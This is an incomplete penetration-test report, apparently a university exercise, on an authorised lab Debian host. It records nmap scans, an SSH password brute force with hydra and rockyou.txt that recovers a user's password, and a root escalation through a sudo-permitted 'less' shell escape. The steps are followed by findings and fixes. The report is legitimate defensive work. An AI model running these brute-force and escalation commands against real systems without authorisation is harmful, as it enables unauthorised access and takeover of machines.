# Preamble

## Approval

*The approval for pentesting the system with the IP addresses 10.1.0.5 and fd01::5 located at the DHBW Mannheim was given by Johannes Bauer.*

## Confidentiality Notice

*This report contains sensitive, privileged, and confidential information. Precautions should be taken to protect the confidentiality of the information in this document. Publication of this report may cause reputational damage to the DHBW Mannheim or facilitate attacks against the DHBW Mannheim. \censor{Philipp Fruck} and \censor{Pius Walter} shall not be held liable for special, incidental, collateral or consequential damages arising out of the use of this information.*

## Disclaimer

*Note that this assessment may not disclose all vulnerabilities that are present on the systems within the scope of the engagement. This report is a summary of the findings from a "point-in-time" assessment made on the server with the given IP addresses 10.1.0.5 and fd01::5. Any changes made to the environment during the period of testing may affect the results of the assessment.*


# Introduction

## Executive Summary

An attacker is able to force the simple password of the user `bluey`. This allows him to easily log in to the system and consequently escalate the highest system privileges (`root`) through an existing misconfiguration on the system.

## Statement of Work

> Warum machen wir das?

## Samples

> Was sind unsere Samples?


# Summary of Findings

> Was haben wir alles gefunden?
> Absteigend nach Relevanz


# Classification Definitions

## Risk Classification

Level                                   | Score | Description
----------|-----|--------------------------------------------------
\cellcolor{risklevelcritical}{Critical} | 10    | The vulnerability poses an immediate threat to the organization. Successful exploitation may permanently affect the organization. Remediation should be immediately performed. 
\cellcolor{risklevelhigh}{High}         | 7-9   | The vulnerability poses an urgent threat to the organization, and remediation should be prioritized.
\cellcolor{risklevelmedium}{Medium}     | 4-6   | Successful exploitation is possible and may result in notable disruption of business functionality. This vulnerability should be remediated when feasible.
\cellcolor{risklevellow}{Low}           | 1-3   | The vulnerability poses a negligible/minimal threat to the organization. The presence of this vulnerability should be noted and remediated if possible.
\cellcolor{gray}{Information}           | 0     | These findings have no clear threat to the organization, but may cause business processes to function differently than desired or reveal sensitive information about the company.

## Exploitation Likelihood Classifications

Likelihood | Description
----------|--------------------------------------------------
\cellcolor{pastelred}{Likely}        | Exploitation methods are well-known and can be performed using publicly available tools. Low-skilled attackers and automated tools could successfully exploit the vulnerability with minimal difficulty.
\cellcolor{pastelyellow}{Possible}   | Exploitation methods are well-known, may be performed using public tools, but require configuration. Understanding of the underlying system is required for successful exploitation.
\cellcolor{pastelgreen}{Unlikely}    | Exploitation requires deep understanding of the underlying systems or advanced technical skills. Precise conditions may be required for successful exploitation.

## Business Impact Classifications

Impact | Description
----------|--------------------------------------------------
\cellcolor{pastelred}{Major}        | Successful exploitation may result in large disruptions of critical business functions across the organization and significant financial damage.
\cellcolor{pastelyellow}{Moderate}   | Successful exploitation may cause significant disruptions to non-critical business functions.
\cellcolor{pastelgreen}{Minor}    | Successful exploitation may affect few users, without causing much disruption to routine business functions.

## Remediation Difficulty Classifications

Difficulty | Description
----------|--------------------------------------------------
\cellcolor{pastelred}{Hard}        | Remediation may require extensive reconfiguration of underlying systems that is time consuming. Remediation may require disruption of normal business functions.
\cellcolor{pastelyellow}{Moderate}   | Remediation may require minor reconfigurations or additions that may be time-intensive or expensive.
\cellcolor{pastelgreen}{Easy}    | Remediation can be accomplished in a short amount of time, with little difficulty.


# Scope

The scope of the Pentest are the two ip addresses 10.1.0.5 and fd01::5 which are mapped to the same machine. The Pentest was initiated as a blackbox test since there was no information provided except for the ip addresses.


# Walkthrough and Findings

## nmap Scan

We started with a nmap scan because this is a standard procedure for blackbox testing.

```default
$ nmap -sV -p1-65535 10.1.0.5       
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-05 04:25 EST
Nmap scan report for 10.1.0.5
Host is up (0.013s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.51 ((Debian))
20321/tcp open  unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.30 seconds
```

```default
$ nmap -sV -p1-65535 -6 fd01::5
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-06 10:08 EST
Nmap scan report for fd01::5
Host is up (0.013s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 8.4p1 Debian 5 (protocol 2.0)
80/tcp    open  http        Apache httpd 2.4.51 ((Debian))
20321/tcp open  unknown
41947/tcp open  ssl/unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.71 seconds
```

After running a nmap scan against each of the ip addresses we noticed that the service on port `41947` is only listening on the IPv6 address. We decided to target the Apache webserver on port `80` first.

## Apache Webserver

The Apache webserver is publicly exposed on both addresses. The main web page is the default Apache Debian web page. The nmap scan fingerprints the version to be `Apache httpd 2.4.51 ((Debian))` which is confirmed in the later course.

### Unencrypted Communication

 It is only listening on port 80 and only accepts connections over the HTTP protocol. This means that no encryption is used.

### Directory Listing

In order to further investigate the content being served by the Apache webserver the nmap http-enum plugin is utilized. 

```default
$ nmap -p80 --script=http-enum 10.1.0.5
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-05 04:30 EST
Nmap scan report for 10.1.0.5
Host is up (0.016s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|_  /home/: Potentially interesting directory w/ listing on 'apache/2.4.51 (debian)'

Nmap done: 1 IP address (1 host up) scanned in 3.07 seconds
```

The http enum plugin was able to quickly identify the `/home` path on the webserver which looks like an interesting hint. Navigating to the given URL in the Browser shows the standard Apache directory listing presenting the following directories

  - `bingo`
  - `bluey`
  - `root`

These directories hint to the available users. All of them are empty.

## User bluey

As shown in the nmap scan there is a SSH server running on port 22. So we decide to brute force the passwords of the users discovered by the Apache directory listing using hydra and the publicly available password list `rockyou.txt`. Hydra quickly identifies a simple password for the `bluey` user. For the other users there were no results found.

```default
$ hydra -l bluey -P /usr/share/wordlists/rockyou.txt 10.1.0.5 -t 4 ssh
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-03-05 04:35:24
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://10.1.0.5:22/
[22][ssh] host: 10.1.0.5   login: bluey   password: phoenix
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-03-05 04:35:32
```

Using the password `phoenix` we are able to log in to the server using `ssh bluey@10.1.0.5`.

```default
ssh bluey@10.1.0.5
bluey@10.1.0.5's password: 
Linux secureding 5.10.0-10-amd64 #1 SMP Debian 5.10.84-1 (2021-12-08) x86_64
Ziz iz ze most zecure ziztem in ze world. Iz Schörmen Kwolitie!!! Weri nais.
Last login: Fri Mar  4 14:19:28 2022 from 10.2.0.14
bluey@secureding:~$ 
```

### Profile Review

Starting the review of the user we entered the `history` command to investigate the last actions of the given user. The command did not return any results which means that the history was cleaned, or the user was not actively used before.

Following a default forensic approach we entered the commands `env` and `alias` as an attempt to retrieve hints about the purpose of the user. Furthermore, we checked the common files in the user `home` directory including `.bashrc` and `.profile`. Neither the commands nor the files let us to any suspicious activity.

In order to easily track down the permissions of files we overwrite the `ls` command with the following alias

```default
alias ls='ls -h -l -p -A --color=auto --time-style=+"  %d.%m.%Y %H:%M:%S"'
```

Further it was checked which folders are present in the `PATH`. Again, there were no differences to the standard installation.

```default
bluey@secureding:~$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

Entering the command `groups` brought the result that the user `bluey` is only in the group `bluey`.

### Directory Review

After taking a look to the standards of a give Linux user profile we investigated the other files in the users `home` folder. With the overwritten `ls` command we saw the following list of interesting directories

  - `.ssh`
  - `.management`

#### .ssh
We found an ed25519 key pair in the `.ssh` folder. The folder and the included key pairs both have properly configured permissions.

```default
bluey@secureding:~/.ssh$ ls
total 8.0K
-rw------- 1 bluey bluey 411   18.02.2022 15:48:56 id_ed25519
-rw------- 1 bluey bluey  98   18.02.2022 15:48:56 id_ed25519.pub
```

We validated that the public key belongs to the private key by generating a new public key for the given private key. Using the `ssh-keygen` command we could confirm that the key pair is valid.

```default
bluey@secureding:~$ ssh-keygen -y -f .ssh/id_ed25519
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDsuFejN+bYDIBakjKTjszppGIcYKmXEpqEgLQs5Trbh bluey@secureding
bluey@secureding:~$ cat .ssh/id_ed25519.pub 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDsuFejN+bYDIBakjKTjszppGIcYKmXEpqEgLQs5Trbh bluey@secureding
```

#### .management

Within the next step we looked at the `.management` folder and found the certificate pair listed below. Interestingly the certificates have their permissions set to `600` despite the users umask being `0022`.

```default
bluey@secureding:~/.management$ ls
total 8.0K
-rw------- 1 bluey bluey 1.3K   16.05.2018 22:45:05 client.crt
-rw------- 1 bluey bluey 1.7K   31.01.2020 15:52:24 client.key
bluey@secureding:~$ umask
0022
```

Looking at the timestamp we figured out that the client key seems like it was last modified one and a half year after the client certificate. The next logical thing to do was to validate the private key and ensure its modulus matches the one of the client certificate. The SHA-256 sums of both moduli match which makes this case even more suspicious.

```default
bluey@secureding:~/.management$ openssl rsa -check -noout -in client.key 
RSA key ok
bluey@secureding:~/.management$ openssl rsa -modulus -noout -in client.key | openssl sha256
(stdin)= b807312729df58b623c639069f77bc73c5faacc269fa833a6861df00530f3b9e
bluey@secureding:~/.management$ openssl x509 -modulus -noout -in client.crt | openssl sha256
(stdin)= b807312729df58b623c639069f77bc73c5faacc269fa833a6861df00530f3b9e
```

We inspected the certificate using the `openssl` command line suite.

```default
bluey@secureding:~/.management$ openssl x509 -in client.crt -text
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 11505421400876481398 (0x9fab77ce466b7b76)
    Signature Algorithm: sha1WithRSAEncryption
        Issuer: CN=Management Client Certificate, O=Secure Systems Inc., OU=admin=false
        Validity
            Not Before: Feb 18 15:48:57 2022 GMT
            Not After : Mar 20 15:48:57 2022 GMT
        Subject: CN=Management Client Certificate, O=Secure Systems Inc., OU=admin=false
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
[...]
            X509v3 Basic Constraints: 
                CA:TRUE
[...]
```

Two interesting facts about the certificate are that the given organizational unit (`OU`) is set to `OU=admin=false` and the given certificate is a CA root certificate, which is shown by the `CA:TRUE` part in the basic constraints block. We keep this in mind and investigate later on.

### The sudoers File

Making a digression back to our root(s), we took a look to the `/etc/sudoers` file. This file has to major issues

  1. Instead of the default permissions (`440`) the file has a permission of `644` which means that the file is world readable to every user on the system.
  2. The user `bluey` is allowed to use the `less` command with root privileges without any password against a specific file.

```default
bluey@secureding:~/.management$ ls /etc/sudoers
-rw-r--r-- 1 root root 774   18.02.2022 15:48:56 /etc/sudoers
bluey@secureding:~/.management$ grep bluey /etc/sudoers
# allow bluey read-only access to /var/log/auth.log
bluey ALL=NOPASSWD: /usr/bin/less /var/log/auth.log
```

Since `less` is an interactive command line tool we can now easily elevate our privileges.

```default
sudo less /var/log/auth.log
> !id
bluey@secureding:~/.management$ sudo less /var/log/auth.log
sudo: unable to resolve host secureding: Name or service not known
uid=0(root) gid=0(root) groups=0(root)
> :e /root/.ssh/id_ed25519
```

As shown by the output of the `id` command we now have a fully qualified root shell to elevate our privileges. Since we did not want to mess up with the system permissions we simply extracted the private root ssh key to our local machine in order to connect to the system as root user.

To mitigate this issue it is recommended to replace `less` with a non-interactive command like `cat` which can then be piped into `less`.

## User root

Logged in with the `root` user we first take a look to the roots home folder. Starting the same way as with the user `bluey` we checked the `history` command which returned a result this time.

```default
secureding [~]: history
    1  ls
    2  cd /etc/
    3  ls
    4  cat hostname
    5  ls
    6  cd /usr/
    7  ls
    8  apt-get install vim
    9  apt-get install acl apt-file bzip2 convmv cryptsetup gnupg git grub2 hdparm hexedit inetutils-tools kbd less linux-image-generic lm-sensors locales lshw lsof lzma man mlocate nano openssh-client openssh-server p7zip-full pciutils psmisc python3 pwgen recode rsync screen sqlite3 unzip usbutils vim xz-utils net-tools
   10  cd /usr; git clone https://github.com/johndoe31415/jbin
   11  cd
   12  skeleton_install --f
   13  ls
   14  ls
   15  cd /etc/
   16  ls
   17  vi locale.gen 
   18  locale-gen 
   19  ls
   20  cd boot/
   21  ls
   22  cd ..
   23  ls
   24  cd home/
   25  ls
   26  cd ..
   27  ls
   28  ls
   29  du -h
   30  ls
   31  ls
   32  apt-get install build-essential
   33  ls
   34  ls cvmstage2/
   35  ls
   36  apt-get install sudo
   37  apt-get install apache2
   38  ls
   39  apt-get install libcurl-dev
   40  apt-get install libcurl4-openssl-dev
   41  apt-get install iptables socat
```

As indicated by the asterisk in the `/etc/shadow` file, there is no password set for the root user. This is generally considered a good practice.

```default
secureding [~]: grep root /etc/shadow
root:*:19040:0:99999:7:::
```

### Directory Review

The standard files in the roots home directory were uninteresting the same way as the ones of bluey, except for the `.bashrc` which sources the `jbin` collection.

```default
secureding [~]: cat .bashrc 
#!/bin/bash
# Remove this line if you do not wish it to be overwritten by an update.
. /usr/jbin/profile.local
```

The `jbin` collection is a Swiss army knife when it comes to system configuration. For example, it sets the default umask for the root user to `0077`.

```default
secureding [~]: umask
0077
```

A few unusual files we found in the root directory include the `.screenrc` and the `.inputrc` which are not created by default. Also, a custom configuration for vim has been deployed. Further interesting files were the `.config/marco-compton.conf`, the `.config/mpv/mpv.conf` and the `.xmodmaprc` which are used to configure a graphical environment and video player respectively. However, there is no graphical environment installed on the machine.

#### .ssh

Like at user bluey we found an ed25519 key pair in the `.ssh` folder. The folder and the included key pairs both have properly configured permissions. Further there is an `authorized_keys` file that allows connection from multiple users, seemingly including the user `bingo`. We will later confirm that this is the public key of the user bingo.

```default
secureding [~/.ssh]: ls
total 12K
-rw------- 1 root root 393   18.02.2022 15:48:57 authorized_keys
-rw------- 1 root root 411   18.02.2022 15:48:57 id_ed25519
-rw------- 1 root root  97   18.02.2022 15:48:57 id_ed25519.pub
secureding [~/.ssh]: cat authorized_keys 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFsdPI7YF8RM45tu6k3V7VlE2dRp4fpqTbFhO0hjbHPt root@secureding
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIl6fQccpuRyA+KTMcvwkxGsqCFbBQ1INDAn9xFxsqZs bingo@secureding
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM0EhQP4e3BVrq0R9nPQzfolf9J49W/UDxSAbQIj6RDM joe@reliant
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFVnbP4txFCQtsfAiZ85sLeZjOJu8ICmxBDuokzTp6Up joe@offsec-concentrator
```

We validated that the public key belongs to the private key by generating a new public key for the given private key. Using the `ssh-keygen` command we could confirm that the key pair is valid.

```default
secureding [~]: ssh-keygen -y -f .ssh/id_ed25519
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFsdPI7YF8RM45tu6k3V7VlE2dRp4fpqTbFhO0hjbHPt root@secureding
secureding [~]: cat .ssh/id_ed25519.pub 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFsdPI7YF8RM45tu6k3V7VlE2dRp4fpqTbFhO0hjbHPt root@secureding
```

Since we have now validated the public key of the root user we can now confirm that the root user can log in using his own ssh key, since it is also included in the `authorized_keys` file. This is not considered as a best practice because

  1. If the private user is only present for the root user and does not exist for any other user on any other machine it is useless to access a machine via ssh he already has shell access to.
  2. If the private key is copied from another machine or another user, this is bad practice as a private key should only be accessible to a single user at a single host.

#### The .rnd File

The most interesting file in the root folder is the `.rnd` file. This file is seemingly used as a seed for a random number generator.

In the later report we will proof that this random file is used by OpenSSL.

```default
secureding [~]: ls .rnd 
-rw------- 1 root root 1,0K   18.02.2022 15:48:57 .rnd
secureding [~]: sha256sum .rnd 
d288c0091af93f3128f66329631ca2b66742ce17f5adb10a0b319911c9a8fe69  .rnd
```

## User bingo

As indicated by the exclamation mark in the `/etc/shadow` file, the password of the user `bingo` is locked. This does not necessarily mean that the account is disabled. If the user has other authentication options like an SSH key or some kind of hardware token he is still able to log in to his account.

```default
secureding [~]: grep bingo /etc/shadow
bingo:!:19041:0:99999:7:::
```

### Directory Review

All the dotfiles in the home directory of the user `bingo` are identical to the ones of the user `bluey`.

```default
secureding [~]: ls /home/bingo/
total 16K
-rw-r--r-- 1 bingo bingo  220   04.08.2021 20:25:59 .bash_logout
-rw-r--r-- 1 bingo bingo 3,5K   04.08.2021 20:25:59 .bashrc
-rw-r--r-- 1 bingo bingo  807   04.08.2021 20:25:59 .profile
drwx------ 2 bingo bingo 4,0K   18.02.2022 15:48:56 .ssh/
```

#### .ssh

Like the other two users described before, the user `bingo` has an ed25519 key pair in the `.ssh` folder. The folder and the included key pairs both have properly configured permissions.

```default
secureding [~]: ls /home/bingo/.ssh/
total 8,0K
-rw------- 1 bingo bingo 411   18.02.2022 15:48:56 id_ed25519
-rw------- 1 bingo bingo  98   18.02.2022 15:48:56 id_ed25519.pub
```

We validated that the public key belongs to the private key by generating a new public key for the given private key. Using the `ssh-keygen` command we could confirm that the key pair is valid.

```default
secureding [~]: ssh-keygen -y -f /home/bingo/.ssh/id_ed25519
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIl6fQccpuRyA+KTMcvwkxGsqCFbBQ1INDAn9xFxsqZs bingo@secureding
secureding [~]: cat /home/bingo/.ssh/id_ed25519.pub 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIl6fQccpuRyA+KTMcvwkxGsqCFbBQ1INDAn9xFxsqZs bingo@secureding
```

As already shown before the user bingo indeed has the ability to login via SSH as user root into the given machine. These circumstances are similar to a privilege escalation and should be avoided at all cost. If the user requires (partial) root privileges this should rather be handled properly via the `/etc/sudoers` file.

## Operating System

The target systems run on the latest stable version of Debian GNU/Linux 11 (bullseye) and has the hostname `secureding`. Furthermore, it is running on the fairly recent kernel version `5.10.84-1 (2021-12-08)` with up-to-date packages installed from the Debian stable repo.

The file `/etc/os-release` gave the following output and consequently a current version of Debian is installed.

```default
bluey@secureding:~$ cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 11 (bullseye)"
NAME="Debian GNU/Linux"
VERSION_ID="11"
VERSION="11 (bullseye)"
VERSION_CODENAME=bullseye
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
```

### Missing Security Updates

The `/etc/apt/sources.list` only contains the following single line of repos. This means that there are no security updates for vulnerable software available.

```default
deb http://ftp.de.debian.org/debian bullseye main
```

To enable security updates it is recommended to add the two new following lines to the `/etc/apt/sources.list`.

```default
deb http://ftp.de.debian.org/debian bullseye main

# note that this is optional
deb http://ftp.de.debian.org/debian bullseye-updates main

deb http://ftp.de.debian.org/debian-security bullseye-security main
```

After enabling and running `sudo apt update` the security repos the following list of updates is available.

```default
secureding [~]: apt list --upgradable
Listing... Done
apache2-bin/stable-security 2.4.52-1~deb11u2 amd64 [upgradable from: 2.4.51-1~deb11u1]
apache2-data/stable-security 2.4.52-1~deb11u2 all [upgradable from: 2.4.51-1~deb11u1]
apache2-utils/stable-security 2.4.52-1~deb11u2 amd64 [upgradable from: 2.4.51-1~deb11u1]
apache2/stable-security 2.4.52-1~deb11u2 amd64 [upgradable from: 2.4.51-1~deb11u1]
bsdextrautils/stable-security 2.36.1-8+deb11u1 amd64 [upgradable from: 2.36.1-8]
bsdutils/stable-security 1:2.36.1-8+deb11u1 amd64 [upgradable from: 1:2.36.1-8]
cryptsetup-bin/stable-security 2:2.3.7-1+deb11u1 amd64 [upgradable from: 2:2.3.5-1]
cryptsetup-initramfs/stable-security 2:2.3.7-1+deb11u1 all [upgradable from: 2:2.3.5-1]
cryptsetup-run/stable-security 2:2.3.7-1+deb11u1 all [upgradable from: 2:2.3.5-1]
cryptsetup/stable-security 2:2.3.7-1+deb11u1 amd64 [upgradable from: 2:2.3.5-1]
fdisk/stable-security 2.36.1-8+deb11u1 amd64 [upgradable from: 2.36.1-8]
libblkid1/stable-security 2.36.1-8+deb11u1 amd64 [upgradable from: 2.36.1-8]
libcryptsetup12/stable-security 2:2.3.7-1+deb11u1 amd64 [upgradable from: 2:2.3.5-1]
libexpat1/stable-security 2.2.10-2+deb11u3 amd64 [upgradable from: 2.2.10-2]
libfdisk1/stable-security 2.36.1-8+deb11u1 amd64 [upgradable from: 2.36.1-8]
libmount1/stable-security 2.36.1-8+deb11u1 amd64 [upgradable from: 2.36.1-8]
libsasl2-2/stable-security 2.1.27+dfsg-2.1+deb11u1 amd64 [upgradable from: 2.1.27+dfsg-2.1]
libsasl2-modules-db/stable-security 2.1.27+dfsg-2.1+deb11u1 amd64 [upgradable from: 2.1.27+dfsg-2.1]
libsasl2-modules/stable-security 2.1.27+dfsg-2.1+deb11u1 amd64 [upgradable from: 2.1.27+dfsg-2.1]
libsmartcols1/stable-security 2.36.1-8+deb11u1 amd64 [upgradable from: 2.36.1-8]
libssl1.1/stable-security 1.1.1k-1+deb11u2 amd64 [upgradable from: 1.1.1k-1+deb11u1]
libuuid1/stable-security 2.36.1-8+deb11u1 amd64 [upgradable from: 2.36.1-8]
linux-image-amd64/stable-security 5.10.103-1 amd64 [upgradable from: 5.10.84-1]
mount/stable-security 2.36.1-8+deb11u1 amd64 [upgradable from: 2.36.1-8]
openssl/stable-security 1.1.1k-1+deb11u2 amd64 [upgradable from: 1.1.1k-1+deb11u1]
util-linux/stable-security 2.36.1-8+deb11u1 amd64 [upgradable from: 2.36.1-8]
```

#### Missing Security Update

> Alles aktualisieren!

This version of Apache is vulnerable to the following CVEs

CVE | Score | Short Description
--|-|-----
CVE-2021-44790 | **\textcolor{risklevelcritical}{9.8}** | Possible buffer overflow when parsing multipart content in mod_lua
CVE-2021-44224 | **\textcolor{risklevelhigh}{8.2}** | Possible NULL dereference or SSRF in forward proxy configurations

### Service Identification

> Beschreibung hinzufügen!

#### Systemd Files

> Beschreibung hinzufügen!

```default
secureding [~]: ls /usr/lib/systemd/system | grep -iP "drs|mgmt|soca"
-rw------- 1 root root  348   27.10.2018 20:02:46 drsfowp.service
-rw------- 1 root root  311   19.06.2018 08:48:40 mgmtserver.service
-rw------- 1 root root  235   11.08.2019 15:16:35 socat.service
```

> Beschreibung hinzufügen!

```default
secureding [~]: for service in {drsfowp,mgmtserver,socat}; do
  cmd=$(grep ExecStart /usr/lib/systemd/system/${service}.service | cut -d "=" -f 2)
  echo $service $cmd
done
drsfowp /usr/local/bin/openssl s_server -accept 443 -WWW -cert /etc/drsfowp/drsfowp.crt -key /etc/drsfowp/drsfowp.key
mgmtserver /opt/mgmtserver/mgmtserver '{ "certfile": "/etc/management-server/server.crt", "keyfile": "/etc/management-server/server.key" }'
socat /usr/bin/socat TCP6-LISTEN:41947,fork TCP4:127.0.0.1:443
```

#### Netstat

> Beschreibung hinzufügen!

```default
secureding [~]: netstat -tulpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      193655/sshd: /usr/s 
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      251/openssl         
tcp6       0      0 :::80                   :::*                    LISTEN      363/apache2         
tcp6       0      0 :::22                   :::*                    LISTEN      193655/sshd: /usr/s 
tcp6       0      0 :::41947                :::*                    LISTEN      256/socat           
tcp6       0      0 :::20321                :::*                    LISTEN      200349/openssl 
```

#### PS

> Beschreibung hinzufügen!

### Service Inspection

> Beschreibung hinzufügen!

#### Management Server

> Beschreibung hinzufügen!

#### drsfowp

> Beschreibung hinzufügen!

#### socat

> Beschreibung hinzufügen!

### Misc

> Auslagern und Beschreibung hinzufügen!

  - Gesamte Verzeichnisstruktur angeschaut
  - Alle Cronjobs angeschaut, was an Jobs verfügbar, war wird gemacht
  - /usr/bin/firmware_update 
  - /usr/bin/heartbeat 


## Network Analysis

> Beschreibung hinzufügen!

```default
bluey@secureding:~$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::41947                :::*                    LISTEN      -
tcp6       0      0 :::20321                :::*                    LISTEN      -

```

### Recommendations

> Beschreibung hinzufügen!

Install the security updates with Apache version `2.4.52`.
